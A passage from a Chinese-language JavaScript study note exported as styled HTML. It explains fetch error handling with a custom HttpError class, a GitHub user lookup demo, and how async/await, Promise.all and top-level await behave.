bold;">即使我们现在不打算对链进行扩展，但我们之后可能会需要。</span></div><div><br/></div><div><br/></div><div style="text-align: start;"><span style="font-size: 12pt; font-weight: bold;">fetch 错误处理示例</span></div><div style="text-align: start;"><br/></div><div style="text-align: start;"><span style="font-size: 12pt;">当请求无法发出时，fetch reject 会返回 promise。例如，远程服务器无法访问，或者 URL 异常。</span></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px;"><div><br/></div><div><span style="font-size: 12pt;">但是如果远程服务器返回响应错误 404，甚至是错误 500，这些都被认为是合法的响应。</span></div></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px;"><br/></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><span style="font-size: 12pt;">fetch('no-such-user.json') // (*)</span></div><div><span style="font-size: 12pt;">  .then(response =&gt; response.json())</span></div><div><span style="font-size: 12pt;">  .then(user =&gt; fetch(`https://api.github.com/users/${user.name}`)) // (**)</span></div><div><span style="font-size: 12pt;">  .then(response =&gt; response.json())</span></div><div><span style="font-size: 12pt;">  .catch(alert); // SyntaxError: Unexpected token &lt; in JSON at position 0</span></div><div><span style="font-size: 12pt;">  // ...</span></div></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px;"><br/></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px;"><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; letter-spacing: normal; orphans: 2; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; font-size: 16px; color: rgb(0, 0, 0); font-family: 微软雅黑; font-variant-caps: normal; font-variant-ligatures: normal;">因为文件 no-such-user.json 不存在，代码试图以 JSON 格式加载响应数据，无论如何都会因为语法错误而失败。</span></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px;"><br/></div><div style="text-align: start;"><span style="font-size: 12pt;">这有点糟糕，因为错</span><span style="font-size: 12pt;">误只是落在链上，并没有相关细节信息：什么失败了，在哪里失败的。</span></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px;"><br/></div><div style="text-align: start;"><span style="font-size: 12pt;">如果在 (*) 行，服务器返回一个错误 500 的非 JSON（non-JSON）页面该怎么办？如果没有这个用户，GitHub 返回错误 404 的页面又该怎么办呢？</span></div><div style="text-align: start;"><br/></div><div style="text-align: start;"><span style="font-size: 12pt;">因此我们多添加一步：检查具有 HTTP 状态的 response.status 属性，如果不是 200 就抛出错误。</span></div><div style="text-align: start;"><br/></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><span style="font-size: 12pt;">class HttpError extends Error { // (1)</span></div><div><span style="font-size: 12pt;">  constructor(response) {</span></div><div><span style="font-size: 12pt;">    super(`${response.status} for ${response.url}`);</span></div><div><span style="font-size: 12pt;">    this.name = 'HttpError';</span></div><div><span style="font-size: 12pt;">    this.response = response;</span></div><div><span style="font-size: 12pt;">  }</span></div><div><span style="font-size: 12pt;">}</span></div><div><br/></div><div><span style="font-size: 12pt;">function loadJson(url) { // (2)</span></div><div><span style="font-size: 12pt;">  return fetch(url)</span></div><div><span style="font-size: 12pt;">    </span><span style="font-size: 12pt; font-weight: bold;">.then(response =&gt; {</span></div><div><span style="font-size: 12pt; font-weight: bold;">      if (response.status == 200) {</span></div><div><span style="font-size: 12pt; font-weight: bold;">        return response.json();</span></div><div><span style="font-size: 12pt; font-weight: bold;">      } else {</span></div><div><span style="font-size: 12pt; font-weight: bold;">        </span><span style="font-size: 12pt; font-weight: bold; color: rgb(255, 0, 0);">throw new HttpError(response);</span></div><div><span style="font-size: 12pt; font-weight: bold;">      }</span></div><div><span style="font-size: 12pt; font-weight: bold;">    })</span></div><div><span style="font-size: 12pt;">}</span></div><div><br/></div><div><span style="font-size: 12pt;">loadJson('no-such-user.json') // (3)</span></div><div><span style="font-size: 12pt;">  .catch(alert); // HttpError: 404 for .../no-such-user.json</span></div></div><div style="text-align: start;"><div><br/></div><div><span style="font-size: 12pt;">1. 我们为 HTTP 错误创建一个自定义类用于区分 HTTP 错误和其他类型错误。</span></div></div><div style="text-align: start;"><br/></div><div style="text-align: start;"><span style="font-size: 12pt;">    此外，新的类有一个 constructor，它接受 response 对象，并将其保存到 error 中。因此，错误处理（error-handling）代码就能够获得响应数据了。</span></div><div style="text-align: start;"><br/></div><div style="text-align: start;"><span style="font-size: 12pt;">2. 然后我们将请求（requesting）和错误处理代码包装进一个函数，它能够 fetch url 并将所有状态码不是 200 视为错误。这很方便，因为我们通常需要这样的逻辑。</span></div><div style="text-align: start;"><br/></div><div style="text-align: start;"><span style="font-size: 12pt;">3. 现在 alert 可以显示更多有用的描述信息了。</span></div><div style="text-align: start;"><br/></div><div style="text-align: start;"><span style="font-size: 12pt;">拥有自定义的错误处理类的好处是我们可以使用 instanceof 很容易地在错误处理代码中检查错误。</span></div><div style="text-align: start;"><br/></div><div style="text-align: start;"><span style="font-size: 12pt;">例如，我们可以创建请求，如果我们得到 404 就可以告知用户修改信息。</span></div><div style="text-align: start;"><br/></div><div style="text-align: start;"><span style="font-size: 12pt;">下面的代码从 GitHub 加载给定名称的用户。如果没有这个用户，它将告知用户填写正确的名称：</span></div><div style="text-align: start;"><br/></div><div style="text-align: start;"><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><span style="font-size: 12pt;">function demoGithubUser() {</span></div><div><span style="font-size: 12pt;">  let name = prompt(&quot;Enter a name?&quot;, &quot;iliakan&quot;);</span></div><div><br/></div><div><span style="font-size: 12pt;">  return loadJson(`https://api.github.com/users/${name}`)</span></div><div><span style="font-size: 12pt;">    .then(user =&gt; {</span></div><div><span style="font-size: 12pt;">      alert(`Full name: ${user.name}.`);</span></div><div><span style="font-size: 12pt;">      return user;</span></div><div><span style="font-size: 12pt;">    })</span></div><div><span style="font-size: 12pt;">    .catch(err =&gt; {</span></div><div><span style="font-size: 12pt; font-weight: bold;">      if (err instanceof HttpError &amp;&amp; err.response.status == 404) {</span></div><div><span style="font-size: 12pt;">        alert(&quot;No such user, please reenter.&quot;);</span></div><div><span style="font-size: 12pt;">        return demoGithubUser();</span></div><div><span style="font-size: 12pt;">      } else {</span></div><div><span style="font-size: 12pt;">        throw err; // (*)</span></div><div><span style="font-size: 12pt;">      }</span></div><div><span style="font-size: 12pt;">    });</span></div><div><span style="font-size: 12pt;">}</span></div><div><br/></div><div><span style="font-size: 12pt;">demoGithubUser();</span></div></div></div><div style="text-align: start;"><br/></div><div style="text-align: start;"><span style="font-size: 12pt;">如果我们有加载指示（load-indication），.finally 是一个很好的处理函数（handler），在 fetch 完成时停止</span><span style="font-size: 12pt;">加载指示</span><span style="font-size: 12pt;">：</span></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px;"><br/></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><span style="font-size: 12pt;">function demoGithubUser() {</span></div><div><span style="font-size: 12pt;">  let name = prompt(&quot;Enter a name?&quot;, &quot;iliakan&quot;);</span></div><div><span style="font-size: 12pt;"> </span><span style="font-size: 12pt; font-weight: bold;"> document.body.style.opacity = 0.3; // (1) 开始指示（indication）</span></div><div><span style="font-size: 12pt;">  return loadJson(`https://api.github.com/users/${name}`)</span></div><div><span style="font-size: 12pt; font-weight: bold;">    .finally(() =&gt; { // (2) 停止指示（indication）</span></div><div><span style="font-size: 12pt; font-weight: bold;">      document.body.style.opacity = '';</span></div><div><span style="font-size: 12pt; font-weight: bold;">      return new Promise(resolve =&gt; setTimeout(resolve)); // (*)</span></div><div><span style="font-size: 12pt; font-weight: bold;">    })</span></div><div><span style="font-size: 12pt;">    .then(user =&gt; {</span></div><div><span style="font-size: 12pt;">      alert(`Full name: ${user.name}.`);</span></div><div><span style="font-size: 12pt;">      return user;</span></div><div><span style="font-size: 12pt;">    })</span></div><div><span style="font-size: 12pt;">    .catch(err =&gt; {</span></div><div><span style="font-size: 12pt;">      if (err instanceof HttpError &amp;&amp; err.response.status == 404) {</span></div><div><span style="font-size: 12pt;">        alert(&quot;No such user, please reenter.&quot;);</span></div><div><span style="font-size: 12pt;">        return demoGithubUser();</span></div><div><span style="font-size: 12pt;">      } else {</span></div><div><span style="font-size: 12pt;">        throw err;</span></div><div><span style="font-size: 12pt;">      }</span></div><div><span style="font-size: 12pt;">    });}</span></div><div><br/></div><div><span style="font-size: 12pt;">demoGithubUser();</span></div></div><div style="text-align: start;"><br/></div><div style="text-align: start;"><span style="font-size: 12pt;">此处的 (1) 行，我们通过调暗文档来指示加载。指示方法没有什么问题，可以使用任何类型的指示来代替。</span></div><div style="text-align: start;"><br/></div><div style="text-align: start;"><span style="font-size: 12pt;">当 promise 得以解决，fetch 可以是成功或者错误，finally 在 (2) 行触发并终止加载指示。</span></div><div style="text-align: start;"><br/></div><div style="text-align: start;"><span style="font-size: 12pt;">有一个浏览器技巧，(*) 是从 finally 返回零延时（zero-timeout）的 promise。</span></div><div style="text-align: start;"><br/></div><div style="text-align: start;"><span style="font-size: 12pt;">这是因为一些浏览器（比如 Chrome）需要“一点时间”外的 promise 处理程序来绘制文档的更改。</span></div><div><b style="font-size: 12pt;"><br/></b></div><div><b style="font-size: 12pt;"><br/></b></div><hr/><div><b style="font-size: 12pt;"><br/></b></div><div><span style="font-size: 12pt; font-weight: bold;">async/await</span></div><div><br/></div><div><span style="font-size: 12pt;">基于 Promise 的代码与一般的回调存在类似的问题。</span></div><div><font style="font-size: 12pt;"><br/></font></div><div><span style="font-size: 12pt;">毕竟 then、catch 和 finally 从根本上来说仍是回调函数。 </span></div><div><font style="font-size: 12pt;"><br/></font></div><div><span style="font-size: 12pt;">Promise 只是将回调分割成广义的可预测结果，使代码更整洁。</span></div><div><font style="font-size: 12pt;"><br/></font></div><div><span style="font-size: 12pt;">这意味着仍有可能陷入 Promise 地狱，而不是回调地狱。</span></div><div><font style="font-size: 12pt;"><br/></font></div><div><span style="font-size: 12pt;">Promise 是改善这种情况的一种很好的尝试，而使用 async 会让代码更简洁。</span></div><div><br/></div><div><img src="8 - EventLoop 、AJAX、异步编程_files/3 [122].jpg" type="image/jpeg" data-filename="3.jpg" width="696"/></div><div><br/></div><div><br/></div><div><img src="8 - EventLoop 、AJAX、异步编程_files/3 [123].jpg" type="image/jpeg" data-filename="3.jpg" width="550"/></div><div><font style="font-size: 12pt;"><br/></font></div><div><span style="font-size: 12pt;">拆分不拆分，参数仍然是函数，本质上还是 callback 形式，只是不需要嵌套多层了</span></div><div><font style="font-size: 12pt;"><br/></font></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">async/await 用法</span></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt;"><br/></span></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">async 表示：放在函数声明之前，将函数转换为异步函数，始终 return 一个 promise 实例。</span></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt;"><br/></span></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">一个函数如果加上 async ，那么该函数就会返回一个 Promise 对象，</span></span><span style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">可以用 then 方法指定下一步的操作。</span></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt;"><br/></span></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">当函数执行的时候，一旦遇到 await 就会先返回，等到异步操作完成，再接着执行函数体内后面的语句。</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">必须等到内部所有 await 命令后面的 Promise 对象执行完，才会发生状态改变，除非遇到 return 语句或者抛出错误。</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">也就是说，只有 async 函数内部的异步操作执行完，才会执行 函数().then 方法指定的回调函数。</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px; font-size: medium; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px;"><span style="font-size: medium;"><img src="8 - EventLoop 、AJAX、异步编程_files/3 [124].jpg" type="image/jpeg" data-filename="3.jpg" width="720"/></span></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px; font-size: medium; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px;"><br/></div><div style="text-align: start;"><span style="font-size: 12pt; font-weight: bold;">当 async 函数内部显式 return 一个值时</span><span style="font-size: 12pt; font-family: 微软雅黑; font-variant-caps: normal; font-variant-ligatures: normal; font-weight: bold;">（不是 new Promise() 实例）</span><span style="font-size: 12pt; font-weight: bold;">，Promise 的 resolve 方法会负责传递这个值；</span></div><div style="text-align: start;"><br/></div><div style="text-align: start;"><span style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">当 async 函数内部抛出异常时，Promise 的 reject 方法会传递这个异常值。</span></span></div><div style="text-align: start;"><br/></div><div style="text-align: start;"><span style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">当 async 函数内部没有 return 时，undefined 将作为 async 当前 promise 的 值，即 return Promise.resolve(undefined)。</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><font style="font-size: 12pt;">async function test() { </font></div><div><font style="font-size: 12pt;">  return &quot;1&quot; </font></div><div><font style="font-size: 12pt;">} </font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;">console.log(test()) // -&gt; Promise {&lt;resolved&gt;: &quot;1&quot;}</font></div></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt;"><br/></span></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">async 函数内部 return 语句返回的值，可以成为 then 方法回调函数的参数。</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt; color: unset; font-family: unset; font-weight: bold;">async 就是将函数返回值使用 Promise.resolve() 包裹了下，和 then 中处理返回值一样。</span></div><div><b style="font-size: 12pt;"><br/></b></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><font style="font-size: 12pt;">async function f() {</font></div><div><font style="font-size: 12pt;">  return 1;</font></div><div><font style="font-size: 12pt;">}</font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;">f().then(alert); // 1</font></div></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">相当于</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><font style="font-size: 12pt;">async function f() {</font></div><div><font style="font-size: 12pt;">  return Promise.resolve(1);</font></div><div><font style="font-size: 12pt;">}</font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;">f().then(alert); // 1</font></div></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">async 使用方式</span></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt;"><br/></span></span></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><font style="font-size: 12pt;">// 函数声明</font></div><div><font style="font-size: 12pt;">async function foo() {};</font></div><div><font style="font-size: 12pt;">foo().then(...)</font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;">// 函数表达式</font></div><div><font style="font-size: 12pt;">const foo = async function () {};</font></div><div><font style="font-size: 12pt;">foo().then(...)</font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;">// 箭头函数</font></div><div><font style="font-size: 12pt;">const foo = async () =&gt; {};</font></div><div><font style="font-size: 12pt;">foo().then(...)</font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;">// 对象的方法</font></div><div><font style="font-size: 12pt;">let obj = { async foo() {} };</font></div><div><font style="font-size: 12pt;">obj.foo().then(...)</font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;">// Class 的方法</font></div><div><font style="font-size: 12pt;">class Storage {</font></div><div><font style="font-size: 12pt;">  constructor() {</font></div><div><font style="font-size: 12pt;">    this.cachePromise = caches.open('avatars');</font></div><div><font style="font-size: 12pt;">  }</font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;">  async getAvatar(name) {</font></div><div><font style="font-size: 12pt;">    const cache = await this.cachePromise;</font></div><div><font style="font-size: 12pt;">    return cache.match(`/avatars/${name}.jpg`);</font></div><div><font style="font-size: 12pt;">  }</font></div><div><font style="font-size: 12pt;">}</font></div><div><font style="font-size: 12pt;">const storage = new Storage();</font></div><div><font style="font-size: 12pt;">storage.getAvatar('jake').then(…);</font></div></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt;"><br/></span></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">await</span></span> <span style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">只能用在 async 函数之中，如果用在普通函数，就会报错。</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><font style="font-size: 12pt;">function dbFuc(db) { // 这里不需要 async</font></div><div><font style="font-size: 12pt;">  let docs = [{}, {}, {}];</font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;">  // 可能得到错误结果</font></div><div><font style="font-size: 12pt;">  docs.forEach(async function (doc) {</font></div><div><font style="font-size: 12pt;">    await db.post(doc);</font></div><div><font style="font-size: 12pt;">  }); <b>// async 放在数组方法中，每次中断的只是 async 形式匿名函数，所以是并发 </b></font></div><div><font style="font-size: 12pt;">}</font></div></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt;"><br/></span></span></div><div><span style="font-size: 12pt;">上面代码可能不会正常工作，原因是这时三个 db.post() 操作将是并发执行，也就是同时执行，而不是继发执行，即</span><span style="font-size: 12pt;">相继执行</span><span style="font-size: 12pt;">。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">正确的写法是采用 for 循环。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><font style="font-size: 12pt;">async function dbFuc(db) {</font></div><div><font style="font-size: 12pt;">  let docs = [{}, {}, {}];</font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;">  for (let doc of docs) {</font></div><div><font style="font-size: 12pt;">    await db.post(doc); <b>// 每次都中断的是最外层函数 dbFunc() ，所以是继发</b></font></div><div><font style="font-size: 12pt;">  }</font></div><div><font style="font-size: 12pt;">}</font></div></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">如果确实希望多个请求并发执行，可以使用 Promise.all 方法。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">当三个请求都会 resolved 时，下面两种写法效果相同。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><font style="font-size: 12pt;">async function dbFuc(db) {</font></div><div><font style="font-size: 12pt;">  let docs = [{}, {}, {}];</font></div><div><font style="font-size: 12pt;">  let promises = docs.map((doc) =&gt; db.post(doc));</font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;">  let results = await Promise.all(promises);</font></div><div><font style="font-size: 12pt;">  console.log(results);</font></div><div><font style="font-size: 12pt;">}</font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;">// 或者使用下面的写法</font></div><div><font style="font-size: 12pt;">async function dbFuc(db) {</font></div><div><font style="font-size: 12pt;">  let docs = [{}, {}, {}];</font></div><div><font style="font-size: 12pt;">  let promises = docs.map((doc) =&gt; db.post(doc));</font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;">  let results = [];</font></div><div><font style="font-size: 12pt;">  for (let promise of promises) {</font></div><div><font style="font-size: 12pt;">    results.push(await promise);</font></div><div><font style="font-size: 12pt;">  }</font></div><div><font style="font-size: 12pt;">  console.log(results);</font></div><div><font style="font-size: 12pt;">}</font></div></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">await 之后的一行相当于 promise 构造函数中的 resolve 参数</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">await 表示：暂停该行代码，暂停当前整个 async function 的执行（直到异步函数返回其结果），允许其他代码在此期间执行。</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt; font-weight: bold;">await 命令后面，可以是 Promise 对象和原始类型的值（数值、字符串和布尔值，但这时会自动转成立即 resolved 的 Promise 对象）。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px; font-size: medium; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px;"><div><span style="font-size: 12pt; color: rgb(0, 0, 0); font-family: 微软雅黑; font-variant-caps: normal; font-variant-ligatures: normal; font-weight: bold;">await 后面的 Promise 对象不必写then，因为 await 的作用之一就是获取后面 promise 对象成功状态传递出来的参数。</span></div></div><div><br/></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">await 命令后面是一个 Promise 对象，返回该对象的结果。</span></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt;"><br/></span></span></div><div><span style="font-size: 12pt; font-weight: bold;">若 promise 处理完成(resolved)，await 表达式会返回 promise 的 resolve 值。</span></div><div><br/></div><div><span style="font-size: 12pt; font-weight: bold;">若 promise 处理失败(rejected)，await 表达式会把 promise 的异常原因抛出。</span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt;"><br/></span></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">如果不是 Promise 对象，就直接返回对应的值。</span></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt;"><br/></span></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">所以，await 后面最好是一个 promise 实例，不然就没有意义</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><font style="font-size: 12pt;">const sleep = time =&gt; {</font></div><div><font style="font-size: 12pt;">  return new Promise(resolve =&gt; setTimeout(resolve, time))</font></div><div><font style="font-size: 12pt;">}</font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;">async function test() { </font></div><div><font style="font-size: 12pt;">  let value = await sleep(1000)</font> <font style="font-size: 12pt;">// 等待，直到 sleep resolve (*)<font> </font></font></div><div><font style="font-size: 12pt;">  console.log(1);</font></div><div><font style="font-size: 12pt;">}</font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;">test()</font></div></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt;"><br/></span></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">顶层 await （没有 async 的 await）</span></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt;"><br/></span></span></div><div><span style="font-size: 12pt;">外层使用 await 抛出 SyntaxError 异常</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">根据语法，await 命令只能出现在 async 函数内部，否则都会报错。</span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt;"><br/></span></span></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><font style="font-size: 12pt;">// 用在顶层代码中会报语法错误 </font></div><div><font style="font-size: 12pt;">let response = await fetch('/article/promise-chaining/user.json'); </font></div><div><font style="font-size: 12pt;">let user = await response.json();</font></div></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt;"><br/></span></span></div><div><span style="font-size: 12pt;">为此我们通常会在外面包裹一个立即执行函数</span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt;"><br/></span></span></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><font style="font-size: 12pt;">(async () =&gt; {</font></div><div><font style="font-size: 12pt;">  let response = await fetch('/article/promise-chaining/user.json');</font></div><div><font style="font-size: 12pt;">  let user = await response.json();</font></div><div><font style="font-size: 12pt;">  ...</font></div><div><font style="font-size: 12pt;">})();</font></div></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt;"><br/></span></span></div><div><span style="font-size: 12pt;">新特性：从 V8 引擎 8.9+ 版本开始，顶层 await 可以在 模块 中工作。</span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt;"><br/></span></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">当然也存在一些缺点，因为 await 将异步代码改造成了同步代码，如果多个异步代码没有依赖性却使用了 await 会导致性能上的降低。</span></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt;"><br/></span></span></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier 